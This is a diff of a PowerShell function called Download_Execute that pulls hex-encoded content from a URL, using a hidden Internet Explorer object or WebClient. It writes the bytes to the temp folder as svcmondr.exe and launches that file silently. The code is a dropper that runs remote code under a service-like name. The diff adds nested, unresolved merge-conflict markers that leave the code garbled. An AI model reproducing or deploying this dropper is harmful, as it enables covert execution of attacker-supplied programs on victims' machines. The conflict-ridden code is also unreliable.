@@ -29,6 +29,7 @@ function Download_Execute
     )
 
 <<<<<<< HEAD
+<<<<<<< HEAD
     $webclient = New-Object System.Net.WebClient    
     #Try to use Default Proxy and Credentials
     #http://stackoverflow.com/questions/14263359/access-web-using-powershell-and-proxy
@@ -54,6 +55,8 @@ function Download_Execute
     }
     [Byte[]] $temp = $hexformat -split ' '
 =======
+=======
+>>>>>>> origin/master
     $webClient = New-Object -ComObject InternetExplorer.Application
     $webClient.Visible = $false
     $webClient.Navigate($URL)
@@ -61,6 +64,9 @@ function Download_Execute
     [string]$hexformat = $webClient.Document.Body.innerText
     $webClient.Quit()
     [Byte[]] $temp = $hexformat -split ' ' 
+<<<<<<< HEAD
+>>>>>>> origin/master
+=======
 >>>>>>> origin/master
     [System.IO.File]::WriteAllBytes("$env:temp\svcmondr.exe", $temp)
     Start-Process -NoNewWindow "$env:temp\svcmondr.exe"
